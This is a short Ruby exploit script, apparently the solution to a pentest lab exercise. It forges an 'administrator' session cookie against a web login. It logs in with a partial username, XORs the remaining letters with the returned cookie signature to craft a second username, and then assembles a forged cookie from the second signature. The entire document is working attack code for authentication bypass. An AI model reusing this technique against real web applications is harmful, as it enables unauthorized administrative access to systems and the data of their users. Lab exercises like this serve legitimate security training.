require 'httparty'
require 'base64'

URL = 'http://ptl-b17fa453-c52a21a7.libcurl.so/'

def login(username)
	res = HTTParty.post(URL+'login.php', body: {username: username,password:'Password1'},follow_redirects:false)
	return CGI.unescape res.headers["set-cookie"].split('=')[-1]
end

cookie1 = login('administ')
signature1 = Base64.decode64(cookie1).split('--')[1]

def xor(str1,str2)
	ret = ""
	str1.split(//).each_with_index do |c, i|
  		ret[i] = (str1[i].ord ^ str2[i].ord).chr
	end
	return ret
end

username = xor("rator\00\00\00",signature1)
cookie2 = login(username)
signature2 = Base64.decode64(cookie2).split('--')[1]
final_cookie = Base64.encode64("administrator--#{signature2}")
puts CGI.escape final_cookie.split('=')[0]

